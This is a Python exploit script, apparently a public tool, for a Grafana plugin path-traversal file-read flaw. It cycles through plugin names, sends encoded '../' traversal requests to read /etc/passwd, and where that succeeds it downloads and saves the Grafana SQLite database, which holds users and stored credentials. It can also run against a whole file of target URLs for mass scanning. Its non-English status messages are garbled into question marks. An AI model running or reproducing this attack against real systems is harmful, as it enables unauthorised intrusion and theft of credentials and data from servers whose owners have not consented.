#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
import time
urllib3.disable_warnings()


def title():
    print("""
                 ___                 __                           ___                   _     ___   _   _       
                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |   | __| (_) | |  ___ 
               | (_ | | '_| / _` | |  _| / _` | | ' \  / _` |    |   / / -_) / _` | / _` |   | _|  | | | | / -_)
                \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|    |_|_\ \___| \__,_| \__,_|   |_|   |_| |_| \___|
                                                                                                 
                                     Author: Henry4E36
               """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        lists = ['grafana-clock-panel', 'alertGroups', 'alertlist', 'alertmanager', 'annolist', 'barchart', 'bargauge',\
                'canvas', 'cloudwatch', 'cloudwatch', 'dashboard', 'dashboard', 'dashlist', 'debug', 'elasticsearch',\
                'gauge','geomap', 'gettingstarted', 'grafana-azure-monitor-datasource', 'grafana', 'graph', 'graphite',\
                 'graphite', 'heatmap', 'histogram', 'influxdb', 'jaeger', 'live', 'logs', 'logs', 'loki', 'mixed', \
                 'mssql', 'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres', 'prometheus',\
                 'stat', 'state-timeline', 'status-history', 'table-old', 'table', 'tempo', 'testdata', 'text', \
                 'timeseries', 'welcome', 'xychart', 'zipkin']
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }

        # proxies = {
        #     "http": "http://127.0.0.1:8080",
        #
        # }
        for i in lists:
            target_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
            try:
                res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
                if res.status_code == 200 and "root:" in res.text:
                    print(f"\033[31m[{chr(8730)}] ????????????: {self.url}???{i}??????????????????????????????\033[0m")
                    print(f"[-] ????????????DB??????:")
                    db_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db"
                    try:
                        res_db = requests.get(url=db_url, headers=headers, verify=False, timeout=25)
                        if res_db.status_code == 200 and "SQLite format" in res_db.text:
                            a = time.time()
                            with open(f'{a}.db', "w") as f:
                                f.write(res_db.text)
                            f.close()
                            print(f"\033[31m[{chr(8730)}] ????????????DB????????????????????????{a}.db?????????\033[0m")
                        else:
                            print(f"[-] ??????DB????????????")
                    except Exception as e:
                        print("[\033[31mX\033[0m] ??????DB????????????,???????????????????????????!")
                        print("[" + "-" * 100 + "]")
                else:
                    print(f"[\033[31mx\033[0m]  ????????????: {self.url} ?????????{i}?????????")
                    print("[" + "-"*100 + "]")
            except Exception as e:
                print("[\033[31mX\033[0m]  ???????????????")
                print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)



if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Grafana ??????????????????')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  ???????????????\neg1:>>>python3 grafana-read.py -u http://127.0.0.1\neg2:>>>python3 grafana-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

